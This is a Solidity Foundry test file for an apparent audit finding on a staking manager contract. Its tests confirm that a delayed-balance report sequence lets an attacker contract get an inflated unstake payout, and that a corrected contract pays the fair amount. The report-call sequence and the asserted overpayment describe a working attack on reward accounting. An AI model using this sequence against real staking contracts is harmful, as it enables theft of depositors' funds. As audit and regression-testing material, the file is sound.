// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    StakeToken,
    CasimirManager,
    CasimirManagerFixed
} from "./35003-accounting-for-rewardstakeratiosum-is-incorrect-when-a-delay.sol";

contract Finding35003Test is Test {
    function _runThreeReports(address target) internal {
        (bool ok,) = target.call(abi.encodeWithSignature("openStake()"));
        require(ok);
        (ok,) = target.call(abi.encodeWithSignature("startReport(uint256)", 0));
        require(ok);
        (ok,) = target.call(abi.encodeWithSignature("syncValidators(uint256)", 32 ether + 105 * 1e15));
        require(ok);
        (ok,) = target.call(abi.encodeWithSignature("finalizeReport()"));
        require(ok);
        (ok,) = target.call(abi.encodeWithSignature("startReport(uint256)", 105 * 1e15));
        require(ok);
        (ok,) = target.call(abi.encodeWithSignature("syncValidators(uint256)", 32 ether));
        require(ok);
        (ok,) = target.call(abi.encodeWithSignature("finalizeReport()"));
        require(ok);
        (ok,) = target.call(abi.encodeWithSignature("startReport(uint256)", 105 * 1e15));
        require(ok);
        (ok,) = target.call(abi.encodeWithSignature("syncValidators(uint256)", 32 ether));
        require(ok);
        (ok,) = target.call(abi.encodeWithSignature("finalizeReport()"));
        require(ok);
    }

    function test_exploit_delayed_balance_overpays_unstake() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.paid(), 32200312500000000000, "paid");
        assertEq(e.fair(), 32100000000000000000, "fair");
        assertEq(e.paid() - e.fair(), 100312500000000000, "overpay");
        assertEq(e.token().balanceOf(address(e)), e.paid(), "attacker received the inflated unstake");
        assertGt(e.manager().rewardStakeRatioSum(), 1e18, "ratio moved");
    }

    function test_control_corrected_sum_pays_fair() public {
        CasimirManagerFixed fixedManager = new CasimirManagerFixed();
        _runThreeReports(address(fixedManager));

        uint256 fair = fixedManager.previewUnstake(32 ether);
        assertEq(fair, 32100000000000000000, "control paid the inflated amount");
        assertEq(fixedManager.latestActiveRewards(), 105 * 1e15, "control zeroed the unclaimed reward");

        Exploit e = new Exploit();
        assertEq(e.manager().fairPayout(32 ether), fair, "fair helper");
        e.run();
        assertGt(e.paid(), fair, "buggy payout is not above the corrected sum");
        assertEq(e.paid(), 32200312500000000000, "buggy paid");
        assertEq(e.paid() - fair, 100312500000000000, "extra versus control");
    }
}
